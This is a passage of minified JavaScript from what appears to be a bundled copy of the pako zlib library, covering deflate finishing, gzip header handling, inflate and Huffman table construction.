i(t,0===t.avail_out?F:U);if(o.strm=t,a=o.last_flush,o.last_flush=e,o.status===rt)if(2===o.wrap)t.adler=0,l(o,31),l(o,139),l(o,8),o.gzhead?(l(o,(o.gzhead.text?1:0)+(o.gzhead.hcrc?2:0)+(o.gzhead.extra?4:0)+(o.gzhead.name?8:0)+(o.gzhead.comment?16:0)),l(o,255&o.gzhead.time),l(o,o.gzhead.time>>8&255),l(o,o.gzhead.time>>16&255),l(o,o.gzhead.time>>24&255),l(o,9===o.level?2:o.strategy>=j||o.level<2?4:0),l(o,255&o.gzhead.os),o.gzhead.extra&&o.gzhead.extra.length&&(l(o,255&o.gzhead.extra.length),l(o,o.gzhead.extra.length>>8&255)),o.gzhead.hcrc&&(t.adler=E(t.adler,o.pending_buf,o.pending,0)),o.gzindex=0,o.status=st):(l(o,0),l(o,0),l(o,0),l(o,0),l(o,0),l(o,9===o.level?2:o.strategy>=j||o.level<2?4:0),l(o,gt),o.status=dt);else{var _=q+(o.w_bits-8<<4)<<8;_|=(o.strategy>=j||o.level<2?0:o.level<6?1:6===o.level?2:3)<<6,0!==o.strstart&&(_|=nt),_+=31-_%31,o.status=dt,h(o,_),0!==o.strstart&&(h(o,t.adler>>>16),h(o,65535&t.adler)),t.adler=1}if(o.status===st)if(o.gzhead.extra){for(d=o.pending;o.gzindex<(65535&o.gzhead.extra.length)&&(o.pending!==o.pending_buf_size||(o.gzhead.hcrc&&o.pending>d&&(t.adler=E(t.adler,o.pending_buf,o.pending-d,d)),s(t),d=o.pending,o.pending!==o.pending_buf_size));)l(o,255&o.gzhead.extra[o.gzindex]),o.gzindex++;o.gzhead.hcrc&&o.pending>d&&(t.adler=E(t.adler,o.pending_buf,o.pending-d,d)),o.gzindex===o.gzhead.extra.length&&(o.gzindex=0,o.status=ot)}else o.status=ot;if(o.status===ot)if(o.gzhead.name){d=o.pending;do{if(o.pending===o.pending_buf_size&&(o.gzhead.hcrc&&o.pending>d&&(t.adler=E(t.adler,o.pending_buf,o.pending-d,d)),s(t),d=o.pending,o.pending===o.pending_buf_size)){f=1;break}f=o.gzindex<o.gzhead.name.length?255&o.gzhead.name.charCodeAt(o.gzindex++):0,l(o,f)}while(0!==f);o.gzhead.hcrc&&o.pending>d&&(t.adler=E(t.adler,o.pending_buf,o.pending-d,d)),0===f&&(o.gzindex=0,o.status=lt)}else o.status=lt;if(o.status===lt)if(o.gzhead.comment){d=o.pending;do{if(o.pending===o.pending_buf_size&&(o.gzhead.hcrc&&o.pending>d&&(t.adler=E(t.adler,o.pending_buf,o.pending-d,d)),s(t),d=o.pending,o.pending===o.pending_buf_size)){f=1;break}f=o.gzindex<o.gzhead.comment.length?255&o.gzhead.comment.charCodeAt(o.gzindex++):0,l(o,f)}while(0!==f);o.gzhead.hcrc&&o.pending>d&&(t.adler=E(t.adler,o.pending_buf,o.pending-d,d)),0===f&&(o.status=ht)}else o.status=ht;if(o.status===ht&&(o.gzhead.hcrc?(o.pending+2>o.pending_buf_size&&s(t),o.pending+2<=o.pending_buf_size&&(l(o,255&t.adler),l(o,t.adler>>8&255),t.adler=0,o.status=dt)):o.status=dt),0!==o.pending){if(s(t),0===t.avail_out)return o.last_flush=-1,D}else if(0===t.avail_in&&n(e)<=n(a)&&e!==N)return i(t,F);if(o.status===ft&&0!==t.avail_in)return i(t,F);if(0!==t.avail_in||0!==o.lookahead||e!==Z&&o.status!==ft){var u=o.strategy===j?g(o,e):o.strategy===K?b(o,e):x[o.level].func(o,e);if(u!==ct&&u!==bt||(o.status=ft),u===_t||u===ct)return 0===t.avail_out&&(o.last_flush=-1),D;if(u===ut&&(e===R?B._tr_align(o):e!==O&&(B._tr_stored_block(o,0,0,!1),e===C&&(r(o.head),0===o.lookahead&&(o.strstart=0,o.block_start=0,o.insert=0))),s(t),0===t.avail_out))return o.last_flush=-1,D}return e!==N?D:o.wrap<=0?I:(2===o.wrap?(l(o,255&t.adler),l(o,t.adler>>8&255),l(o,t.adler>>16&255),l(o,t.adler>>24&255),l(o,255&t.total_in),l(o,t.total_in>>8&255),l(o,t.total_in>>16&255),l(o,t.total_in>>24&255)):(h(o,t.adler>>>16),h(o,65535&t.adler)),s(t),o.wrap>0&&(o.wrap=-o.wrap),0!==o.pending?D:I)},a.deflateEnd=function(t){var e;return t&&t.state?(e=t.state.status)!==rt&&e!==st&&e!==ot&&e!==lt&&e!==ht&&e!==dt&&e!==ft?i(t,U):(t.state=null,e===dt?i(t,T):D):U},a.deflateSetDictionary=function(t,e){var a,i,n,s,o,l,h,d,f=e.length;if(!t||!t.state)return U;if(a=t.state,2===(s=a.wrap)||1===s&&a.status!==rt||a.lookahead)return U;for(1===s&&(t.adler=S(t.adler,e,f,0)),a.wrap=0,f>=a.w_size&&(0===s&&(r(a.head),a.strstart=0,a.block_start=0,a.insert=0),d=new z.Buf8(a.w_size),z.arraySet(d,e,f-a.w_size,a.w_size,0),e=d,f=a.w_size),o=t.avail_in,l=t.next_in,h=t.input,t.avail_in=f,t.next_in=0,t.input=e,_(a);a.lookahead>=et;){i=a.strstart,n=a.lookahead-(et-1);do{a.ins_h=(a.ins_h<<a.hash_shift^a.window[i+et-1])&a.hash_mask,a.prev[i&a.w_mask]=a.head[a.ins_h],a.head[a.ins_h]=i,i++}while(--n);a.strstart=i,a.lookahead=et-1,_(a)}return a.strstart+=a.lookahead,a.block_start=a.strstart,a.insert=a.lookahead,a.lookahead=0,a.match_length=a.prev_length=et-1,a.match_available=0,t.next_in=l,t.input=h,t.avail_in=o,a.wrap=s,D},a.deflateInfo="pako deflate (from Nodeca project)"},{"../utils/common":3,"./adler32":5,"./crc32":7,"./messages":13,"./trees":14}],9:[function(t,e,a){"use strict";e.exports=function(){this.text=0,this.time=0,this.xflags=0,this.os=0,this.extra=null,this.extra_len=0,this.name="",this.comment="",this.hcrc=0,this.done=!1}},{}],10:[function(t,e,a){"use strict";e.exports=function(t,e){var a,i,n,r,s,o,l,h,d,f,_,u,c,b,g,m,w,p,v,k,y,x,z,B,S;a=t.state,i=t.next_in,B=t.input,n=i+(t.avail_in-5),r=t.next_out,S=t.output,s=r-(e-t.avail_out),o=r+(t.avail_out-257),l=a.dmax,h=a.wsize,d=a.whave,f=a.wnext,_=a.window,u=a.hold,c=a.bits,b=a.lencode,g=a.distcode,m=(1<<a.lenbits)-1,w=(1<<a.distbits)-1;t:do{c<15&&(u+=B[i++]<<c,c+=8,u+=B[i++]<<c,c+=8),p=b[u&m];e:for(;;){if(v=p>>>24,u>>>=v,c-=v,0===(v=p>>>16&255))S[r++]=65535&p;else{if(!(16&v)){if(0==(64&v)){p=b[(65535&p)+(u&(1<<v)-1)];continue e}if(32&v){a.mode=12;break t}t.msg="invalid literal/length code",a.mode=30;break t}k=65535&p,(v&=15)&&(c<v&&(u+=B[i++]<<c,c+=8),k+=u&(1<<v)-1,u>>>=v,c-=v),c<15&&(u+=B[i++]<<c,c+=8,u+=B[i++]<<c,c+=8),p=g[u&w];a:for(;;){if(v=p>>>24,u>>>=v,c-=v,!(16&(v=p>>>16&255))){if(0==(64&v)){p=g[(65535&p)+(u&(1<<v)-1)];continue a}t.msg="invalid distance code",a.mode=30;break t}if(y=65535&p,v&=15,c<v&&(u+=B[i++]<<c,(c+=8)<v&&(u+=B[i++]<<c,c+=8)),(y+=u&(1<<v)-1)>l){t.msg="invalid distance too far back",a.mode=30;break t}if(u>>>=v,c-=v,v=r-s,y>v){if((v=y-v)>d&&a.sane){t.msg="invalid distance too far back",a.mode=30;break t}if(x=0,z=_,0===f){if(x+=h-v,v<k){k-=v;do{S[r++]=_[x++]}while(--v);x=r-y,z=S}}else if(f<v){if(x+=h+f-v,(v-=f)<k){k-=v;do{S[r++]=_[x++]}while(--v);if(x=0,f<k){k-=v=f;do{S[r++]=_[x++]}while(--v);x=r-y,z=S}}}else if(x+=f-v,v<k){k-=v;do{S[r++]=_[x++]}while(--v);x=r-y,z=S}for(;k>2;)S[r++]=z[x++],S[r++]=z[x++],S[r++]=z[x++],k-=3;k&&(S[r++]=z[x++],k>1&&(S[r++]=z[x++]))}else{x=r-y;do{S[r++]=S[x++],S[r++]=S[x++],S[r++]=S[x++],k-=3}while(k>2);k&&(S[r++]=S[x++],k>1&&(S[r++]=S[x++]))}break}}break}}while(i<n&&r<o);i-=k=c>>3,u&=(1<<(c-=k<<3))-1,t.next_in=i,t.next_out=r,t.avail_in=i<n?n-i+5:5-(i-n),t.avail_out=r<o?o-r+257:257-(r-o),a.hold=u,a.bits=c}},{}],11:[function(t,e,a){"use strict";function i(t){return(t>>>24&255)+(t>>>8&65280)+((65280&t)<<8)+((255&t)<<24)}function n(){this.mode=0,this.last=!1,this.wrap=0,this.havedict=!1,this.flags=0,this.dmax=0,this.check=0,this.total=0,this.head=null,this.wbits=0,this.wsize=0,this.whave=0,this.wnext=0,this.window=null,this.hold=0,this.bits=0,this.length=0,this.offset=0,this.extra=0,this.lencode=null,this.distcode=null,this.lenbits=0,this.distbits=0,this.ncode=0,this.nlen=0,this.ndist=0,this.have=0,this.next=null,this.lens=new u.Buf16(320),this.work=new u.Buf16(288),this.lendyn=null,this.distdyn=null,this.sane=0,this.back=0,this.was=0}function r(t){var e;return t&&t.state?(e=t.state,t.total_in=t.total_out=e.total=0,t.msg="",e.wrap&&(t.adler=1&e.wrap),e.mode=N,e.last=0,e.havedict=0,e.dmax=32768,e.head=null,e.hold=0,e.bits=0,e.lencode=e.lendyn=new u.Buf32(dt),e.distcode=e.distdyn=new u.Buf32(ft),e.sane=1,e.back=-1,z):E}function s(t){var e;return t&&t.state?(e=t.state,e.wsize=0,e.whave=0,e.wnext=0,r(t)):E}function o(t,e){var a,i;return t&&t.state?(i=t.state,e<0?(a=0,e=-e):(a=1+(e>>4),e<48&&(e&=15)),e&&(e<8||e>15)?E:(null!==i.window&&i.wbits!==e&&(i.window=null),i.wrap=a,i.wbits=e,s(t))):E}function l(t,e){var a,i;return t?(i=new n,t.state=i,i.window=null,(a=o(t,e))!==z&&(t.state=null),a):E}function h(t){if(ut){var e;for(f=new u.Buf32(512),_=new u.Buf32(32),e=0;e<144;)t.lens[e++]=8;for(;e<256;)t.lens[e++]=9;for(;e<280;)t.lens[e++]=7;for(;e<288;)t.lens[e++]=8;for(m(p,t.lens,0,288,f,0,t.work,{bits:9}),e=0;e<32;)t.lens[e++]=5;m(v,t.lens,0,32,_,0,t.work,{bits:5}),ut=!1}t.lencode=f,t.lenbits=9,t.distcode=_,t.distbits=5}function d(t,e,a,i){var n,r=t.state;return null===r.window&&(r.wsize=1<<r.wbits,r.wnext=0,r.whave=0,r.window=new u.Buf8(r.wsize)),i>=r.wsize?(u.arraySet(r.window,e,a-r.wsize,r.wsize,0),r.wnext=0,r.whave=r.wsize):((n=r.wsize-r.wnext)>i&&(n=i),u.arraySet(r.window,e,a-i,n,r.wnext),(i-=n)?(u.arraySet(r.window,e,a-i,i,0),r.wnext=i,r.whave=r.wsize):(r.wnext+=n,r.wnext===r.wsize&&(r.wnext=0),r.whave<r.wsize&&(r.whave+=n))),0}var f,_,u=t("../utils/common"),c=t("./adler32"),b=t("./crc32"),g=t("./inffast"),m=t("./inftrees"),w=0,p=1,v=2,k=4,y=5,x=6,z=0,B=1,S=2,E=-2,A=-3,Z=-4,R=-5,C=8,N=1,O=2,D=3,I=4,U=5,T=6,F=7,L=8,H=9,j=10,K=11,M=12,P=13,Y=14,q=15,G=16,X=17,W=18,J=19,Q=20,V=21,$=22,tt=23,et=24,at=25,it=26,nt=27,rt=28,st=29,ot=30,lt=31,ht=32,dt=852,ft=592,_t=15,ut=!0;a.inflateReset=s,a.inflateReset2=o,a.inflateResetKeep=r,a.inflateInit=function(t){return l(t,_t)},a.inflateInit2=l,a.inflate=function(t,e){var a,n,r,s,o,l,f,_,dt,ft,_t,ut,ct,bt,gt,mt,wt,pt,vt,kt,yt,xt,zt,Bt,St=0,Et=new u.Buf8(4),At=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15];if(!t||!t.state||!t.output||!t.input&&0!==t.avail_in)return E;(a=t.state).mode===M&&(a.mode=P),o=t.next_out,r=t.output,f=t.avail_out,s=t.next_in,n=t.input,l=t.avail_in,_=a.hold,dt=a.bits,ft=l,_t=f,xt=z;t:for(;;)switch(a.mode){case N:if(0===a.wrap){a.mode=P;break}for(;dt<16;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if(2&a.wrap&&35615===_){a.check=0,Et[0]=255&_,Et[1]=_>>>8&255,a.check=b(a.check,Et,2,0),_=0,dt=0,a.mode=O;break}if(a.flags=0,a.head&&(a.head.done=!1),!(1&a.wrap)||(((255&_)<<8)+(_>>8))%31){t.msg="incorrect header check",a.mode=ot;break}if((15&_)!==C){t.msg="unknown compression method",a.mode=ot;break}if(_>>>=4,dt-=4,yt=8+(15&_),0===a.wbits)a.wbits=yt;else if(yt>a.wbits){t.msg="invalid window size",a.mode=ot;break}a.dmax=1<<yt,t.adler=a.check=1,a.mode=512&_?j:M,_=0,dt=0;break;case O:for(;dt<16;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if(a.flags=_,(255&a.flags)!==C){t.msg="unknown compression method",a.mode=ot;break}if(57344&a.flags){t.msg="unknown header flags set",a.mode=ot;break}a.head&&(a.head.text=_>>8&1),512&a.flags&&(Et[0]=255&_,Et[1]=_>>>8&255,a.check=b(a.check,Et,2,0)),_=0,dt=0,a.mode=D;case D:for(;dt<32;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}a.head&&(a.head.time=_),512&a.flags&&(Et[0]=255&_,Et[1]=_>>>8&255,Et[2]=_>>>16&255,Et[3]=_>>>24&255,a.check=b(a.check,Et,4,0)),_=0,dt=0,a.mode=I;case I:for(;dt<16;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}a.head&&(a.head.xflags=255&_,a.head.os=_>>8),512&a.flags&&(Et[0]=255&_,Et[1]=_>>>8&255,a.check=b(a.check,Et,2,0)),_=0,dt=0,a.mode=U;case U:if(1024&a.flags){for(;dt<16;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}a.length=_,a.head&&(a.head.extra_len=_),512&a.flags&&(Et[0]=255&_,Et[1]=_>>>8&255,a.check=b(a.check,Et,2,0)),_=0,dt=0}else a.head&&(a.head.extra=null);a.mode=T;case T:if(1024&a.flags&&((ut=a.length)>l&&(ut=l),ut&&(a.head&&(yt=a.head.extra_len-a.length,a.head.extra||(a.head.extra=new Array(a.head.extra_len)),u.arraySet(a.head.extra,n,s,ut,yt)),512&a.flags&&(a.check=b(a.check,n,ut,s)),l-=ut,s+=ut,a.length-=ut),a.length))break t;a.length=0,a.mode=F;case F:if(2048&a.flags){if(0===l)break t;ut=0;do{yt=n[s+ut++],a.head&&yt&&a.length<65536&&(a.head.name+=String.fromCharCode(yt))}while(yt&&ut<l);if(512&a.flags&&(a.check=b(a.check,n,ut,s)),l-=ut,s+=ut,yt)break t}else a.head&&(a.head.name=null);a.length=0,a.mode=L;case L:if(4096&a.flags){if(0===l)break t;ut=0;do{yt=n[s+ut++],a.head&&yt&&a.length<65536&&(a.head.comment+=String.fromCharCode(yt))}while(yt&&ut<l);if(512&a.flags&&(a.check=b(a.check,n,ut,s)),l-=ut,s+=ut,yt)break t}else a.head&&(a.head.comment=null);a.mode=H;case H:if(512&a.flags){for(;dt<16;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if(_!==(65535&a.check)){t.msg="header crc mismatch",a.mode=ot;break}_=0,dt=0}a.head&&(a.head.hcrc=a.flags>>9&1,a.head.done=!0),t.adler=a.check=0,a.mode=M;break;case j:for(;dt<32;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}t.adler=a.check=i(_),_=0,dt=0,a.mode=K;case K:if(0===a.havedict)return t.next_out=o,t.avail_out=f,t.next_in=s,t.avail_in=l,a.hold=_,a.bits=dt,S;t.adler=a.check=1,a.mode=M;case M:if(e===y||e===x)break t;case P:if(a.last){_>>>=7&dt,dt-=7&dt,a.mode=nt;break}for(;dt<3;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}switch(a.last=1&_,_>>>=1,dt-=1,3&_){case 0:a.mode=Y;break;case 1:if(h(a),a.mode=Q,e===x){_>>>=2,dt-=2;break t}break;case 2:a.mode=X;break;case 3:t.msg="invalid block type",a.mode=ot}_>>>=2,dt-=2;break;case Y:for(_>>>=7&dt,dt-=7&dt;dt<32;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if((65535&_)!=(_>>>16^65535)){t.msg="invalid stored block lengths",a.mode=ot;break}if(a.length=65535&_,_=0,dt=0,a.mode=q,e===x)break t;case q:a.mode=G;case G:if(ut=a.length){if(ut>l&&(ut=l),ut>f&&(ut=f),0===ut)break t;u.arraySet(r,n,s,ut,o),l-=ut,s+=ut,f-=ut,o+=ut,a.length-=ut;break}a.mode=M;break;case X:for(;dt<14;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if(a.nlen=257+(31&_),_>>>=5,dt-=5,a.ndist=1+(31&_),_>>>=5,dt-=5,a.ncode=4+(15&_),_>>>=4,dt-=4,a.nlen>286||a.ndist>30){t.msg="too many length or distance symbols",a.mode=ot;break}a.have=0,a.mode=W;case W:for(;a.have<a.ncode;){for(;dt<3;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}a.lens[At[a.have++]]=7&_,_>>>=3,dt-=3}for(;a.have<19;)a.lens[At[a.have++]]=0;if(a.lencode=a.lendyn,a.lenbits=7,zt={bits:a.lenbits},xt=m(w,a.lens,0,19,a.lencode,0,a.work,zt),a.lenbits=zt.bits,xt){t.msg="invalid code lengths set",a.mode=ot;break}a.have=0,a.mode=J;case J:for(;a.have<a.nlen+a.ndist;){for(;St=a.lencode[_&(1<<a.lenbits)-1],gt=St>>>24,mt=St>>>16&255,wt=65535&St,!(gt<=dt);){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if(wt<16)_>>>=gt,dt-=gt,a.lens[a.have++]=wt;else{if(16===wt){for(Bt=gt+2;dt<Bt;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if(_>>>=gt,dt-=gt,0===a.have){t.msg="invalid bit length repeat",a.mode=ot;break}yt=a.lens[a.have-1],ut=3+(3&_),_>>>=2,dt-=2}else if(17===wt){for(Bt=gt+3;dt<Bt;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}dt-=gt,yt=0,ut=3+(7&(_>>>=gt)),_>>>=3,dt-=3}else{for(Bt=gt+7;dt<Bt;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}dt-=gt,yt=0,ut=11+(127&(_>>>=gt)),_>>>=7,dt-=7}if(a.have+ut>a.nlen+a.ndist){t.msg="invalid bit length repeat",a.mode=ot;break}for(;ut--;)a.lens[a.have++]=yt}}if(a.mode===ot)break;if(0===a.lens[256]){t.msg="invalid code -- missing end-of-block",a.mode=ot;break}if(a.lenbits=9,zt={bits:a.lenbits},xt=m(p,a.lens,0,a.nlen,a.lencode,0,a.work,zt),a.lenbits=zt.bits,xt){t.msg="invalid literal/lengths set",a.mode=ot;break}if(a.distbits=6,a.distcode=a.distdyn,zt={bits:a.distbits},xt=m(v,a.lens,a.nlen,a.ndist,a.distcode,0,a.work,zt),a.distbits=zt.bits,xt){t.msg="invalid distances set",a.mode=ot;break}if(a.mode=Q,e===x)break t;case Q:a.mode=V;case V:if(l>=6&&f>=258){t.next_out=o,t.avail_out=f,t.next_in=s,t.avail_in=l,a.hold=_,a.bits=dt,g(t,_t),o=t.next_out,r=t.output,f=t.avail_out,s=t.next_in,n=t.input,l=t.avail_in,_=a.hold,dt=a.bits,a.mode===M&&(a.back=-1);break}for(a.back=0;St=a.lencode[_&(1<<a.lenbits)-1],gt=St>>>24,mt=St>>>16&255,wt=65535&St,!(gt<=dt);){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if(mt&&0==(240&mt)){for(pt=gt,vt=mt,kt=wt;St=a.lencode[kt+((_&(1<<pt+vt)-1)>>pt)],gt=St>>>24,mt=St>>>16&255,wt=65535&St,!(pt+gt<=dt);){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}_>>>=pt,dt-=pt,a.back+=pt}if(_>>>=gt,dt-=gt,a.back+=gt,a.length=wt,0===mt){a.mode=it;break}if(32&mt){a.back=-1,a.mode=M;break}if(64&mt){t.msg="invalid literal/length code",a.mode=ot;break}a.extra=15&mt,a.mode=$;case $:if(a.extra){for(Bt=a.extra;dt<Bt;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}a.length+=_&(1<<a.extra)-1,_>>>=a.extra,dt-=a.extra,a.back+=a.extra}a.was=a.length,a.mode=tt;case tt:for(;St=a.distcode[_&(1<<a.distbits)-1],gt=St>>>24,mt=St>>>16&255,wt=65535&St,!(gt<=dt);){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if(0==(240&mt)){for(pt=gt,vt=mt,kt=wt;St=a.distcode[kt+((_&(1<<pt+vt)-1)>>pt)],gt=St>>>24,mt=St>>>16&255,wt=65535&St,!(pt+gt<=dt);){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}_>>>=pt,dt-=pt,a.back+=pt}if(_>>>=gt,dt-=gt,a.back+=gt,64&mt){t.msg="invalid distance code",a.mode=ot;break}a.offset=wt,a.extra=15&mt,a.mode=et;case et:if(a.extra){for(Bt=a.extra;dt<Bt;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}a.offset+=_&(1<<a.extra)-1,_>>>=a.extra,dt-=a.extra,a.back+=a.extra}if(a.offset>a.dmax){t.msg="invalid distance too far back",a.mode=ot;break}a.mode=at;case at:if(0===f)break t;if(ut=_t-f,a.offset>ut){if((ut=a.offset-ut)>a.whave&&a.sane){t.msg="invalid distance too far back",a.mode=ot;break}ut>a.wnext?(ut-=a.wnext,ct=a.wsize-ut):ct=a.wnext-ut,ut>a.length&&(ut=a.length),bt=a.window}else bt=r,ct=o-a.offset,ut=a.length;ut>f&&(ut=f),f-=ut,a.length-=ut;do{r[o++]=bt[ct++]}while(--ut);0===a.length&&(a.mode=V);break;case it:if(0===f)break t;r[o++]=a.length,f--,a.mode=V;break;case nt:if(a.wrap){for(;dt<32;){if(0===l)break t;l--,_|=n[s++]<<dt,dt+=8}if(_t-=f,t.total_out+=_t,a.total+=_t,_t&&(t.adler=a.check=a.flags?b(a.check,r,_t,o-_t):c(a.check,r,_t,o-_t)),_t=f,(a.flags?_:i(_))!==a.check){t.msg="incorrect data check",a.mode=ot;break}_=0,dt=0}a.mode=rt;case rt:if(a.wrap&&a.flags){for(;dt<32;){if(0===l)break t;l--,_+=n[s++]<<dt,dt+=8}if(_!==(4294967295&a.total)){t.msg="incorrect length check",a.mode=ot;break}_=0,dt=0}a.mode=st;case st:xt=B;break t;case ot:xt=A;break t;case lt:return Z;case ht:default:return E}return t.next_out=o,t.avail_out=f,t.next_in=s,t.avail_in=l,a.hold=_,a.bits=dt,(a.wsize||_t!==t.avail_out&&a.mode<ot&&(a.mode<nt||e!==k))&&d(t,t.output,t.next_out,_t-t.avail_out)?(a.mode=lt,Z):(ft-=t.avail_in,_t-=t.avail_out,t.total_in+=ft,t.total_out+=_t,a.total+=_t,a.wrap&&_t&&(t.adler=a.check=a.flags?b(a.check,r,_t,t.next_out-_t):c(a.check,r,_t,t.next_out-_t)),t.data_type=a.bits+(a.last?64:0)+(a.mode===M?128:0)+(a.mode===Q||a.mode===q?256:0),(0===ft&&0===_t||e===k)&&xt===z&&(xt=R),xt)},a.inflateEnd=function(t){if(!t||!t.state)return E;var e=t.state;return e.window&&(e.window=null),t.state=null,z},a.inflateGetHeader=function(t,e){var a;return t&&t.state?0==(2&(a=t.state).wrap)?E:(a.head=e,e.done=!1,z):E},a.inflateSetDictionary=function(t,e){var a,i,n=e.length;return t&&t.state?0!==(a=t.state).wrap&&a.mode!==K?E:a.mode===K&&(i=1,(i=c(i,e,n,0))!==a.check)?A:d(t,e,n,n)?(a.mode=lt,Z):(a.havedict=1,z):E},a.inflateInfo="pako inflate (from Nodeca project)"},{"../utils/common":3,"./adler32":5,"./crc32":7,"./inffast":10,"./inftrees":12}],12:[function(t,e,a){"use strict";var i=t("../utils/common"),n=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,0,0],r=[16,16,16,16,16,16,16,16,17,17,17,17,18,18,18,18,19,19,19,19,20,20,20,20,21,21,21,21,16,72,78],s=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577,0,0],o=[16,16,16,16,17,17,18,18,19,19,20,20,21,21,22,22,23,23,24,24,25,25,26,26,27,27,28,28,29,29,64,64];e.exports=function(t,e,a,l,h,d,f,_){var u,c,b,g,m,w,p,v,k,y=_.bits,x=0,z=0,B=0,S=0,E=0,A=0,Z=0,R=0,C=0,N=0,O=null,D=0,I=new i.Buf16(16),U=new i.Buf16(16),T=null,F=0;for(x=0;x<=15;x++)I[x]=0;for(z=0;z<l;z++)I[e[a+z]]++;for(E=y,S=15;S>=1&&0===I[S];S--);if(E>S&&(E=S),0===S)return h[d++]=20971520,h[d++]=20971520,_.bits=1,0;for(B=1;B<S&&0===I[B];B++);for(E<B&&(E=B),R=1,x=1;x<=15;x++)if(R<<=1,(R-=I[x])<0)return-1;if(R>0&&(0===t||1!==S))return-1;for(U[1]=0,x=1;x<15;x++)U[x+1]=U[x]+I[x];for(z=0;z<l;z++)0!==e[a+z]&&(f[U[e[a+z]]++]=z);if(0===t?(O=T=f,w=19):1===t?(O=n,D-=257,T=r,F-=257,w=256):(O=s,T=o,w=-1),N=0,z=0,x=B,m=d,A=E,Z=0,b=-1,C=1<<E,g=C-1,1===t&&C>852||2===t&&C>592)return 1;for(;;){p=x-Z,f[z]<w?(v=0,k=f[z]):f[z]>w?(v=T[F+f[z]],k=O[D+f[z]]):(v=96,k=0),u=1<<x-Z,B=c=1<<A;do{h[m+(N>>Z)+(c-=u)]=p<<24|v<<16|k|0}while(0!==c);for(u=1<<x-1;N&u;)u>>=1;if(0!==u?(N&=u-1,N+=u):N=0,z++,0==--I[x]){if(x===S)break;x=e[a+f[z]]}if(x>E&&(N&g)!==b){for(0===Z&&(Z=E),m+=B,R=1<<(A=x-Z);A+Z<S&&!((R-=I[A+Z])<=0);)A++,R<<=1;if(C+=1<<A,1===t&&C>852||2===t&&C>592)return 1;h[b=N&g]=E<<24|A<<16|m-d|0}}return 0!==N&&(h[m+N]=x-Z<<24|64<<16|0),_.bits=E,0}},{"../utils/common":3}],13:[function(t,e,a){"use strict";e.exports={2:"need dictionary",1:"stream end",0:"","-1":"file error","-2":"stream error","-3":"data error","-4":"insufficient memory","-5":"buffer error","-6":"incompatible version"}},{}],14:[function(t,e,a){"use strict";function i(t){for(var e=t.length;--e>=0;)t[e]=0}function n(t,e,a,i,n){this.static_tree=t,this.extra_bits=e,this.extra_base=a,this.elems=i,this.max_length=n,this.has_stree=t&&t.length}function r(t,e){this.dyn_tree=t,this.max_code=0,this.stat_desc=e}function s(t){return t<256?et[t]:et[256+(t>>>7)]}function o(t,e){t.pending_buf[t.pending++]=255&e,t.pending_buf[t.pending++]=e>>>8&255}function l(t,e,a){t.bi_valid>M-a?(t.bi_buf|=e<<t.bi_valid&65535,o(t,t.bi_buf),t.bi_buf=e>>M-t.bi_valid,t.bi_valid+=a-M):(t.bi_buf|=e<<t.bi_valid&65535,t.bi_valid+=a)}function h(t,e,a){l(t,a[2*e],a[2*e+1])}function d(t,e){var a=0;do{a|=1&t,t>>>=1,a<<=1}while(--e>0);return a>>>1}function f(t){16===t.bi_valid?(o(t,t.bi_buf),t.bi_buf=0,t.bi_valid=0):t.bi_valid>=8&&(t.pending_buf[t.pending++]=255&t.bi_buf,t.bi_buf>>=8,t.bi_valid-=8)}function _(t,e){var a,i,n,r,s,o,l=e.dyn_tree,h=e.max_code,d=e.stat_desc.static_tree,f=e.stat_desc.has_stree,_=e.stat_desc.extra_bits,u=e.stat_desc.extra_base,c=e.stat_desc.max_length,b=0;for(r=0;r<=K;r++)t.bl_count[r]=0;for(l[2*t.heap[t.heap_max]+1]=0,a=t.heap_max+1;a<j;a++)(r=l[2*l[2*(i=t.heap[a])+1]+1]+1)>c&&(r=c,b++),l[2*i+1]=r,i>h||(t.bl_count[r]++,s=0,i>=u&&(s=_[i-u]),o=l[2*i],t.opt_len+=o*(r+s),f&&(t.static_len+=o*(d[2*i+1]+s)));if(0!==b){do{for(r=c-1;0===t.bl_count[r];)r--;t.bl_count[r]--,t.bl_count[r+1]+=2,t.bl_count[c]--,b-=2}while(b>0);for(r=c;0!==r;r--)for(i=t.bl_count[r];0!==i;)(n=t.heap[--a])>h||(l[2*n+1]!==r&&(t.opt_len+=(r-l[2*n+1])*l[2*n],l[2*n+1]=r),i--)}}function u(t,e,a){var i,n,r=new Array(K+1),s=0;for(i=1;i<=K;i++)r[i]=s=s+a[i-1]<<1;for(n=0;n<=e;n++){var o=t[2*n+1];0!==o&&(t[2*n]=d(r[o]++,o))}}function c(){var t,e,a,i,r,s=new 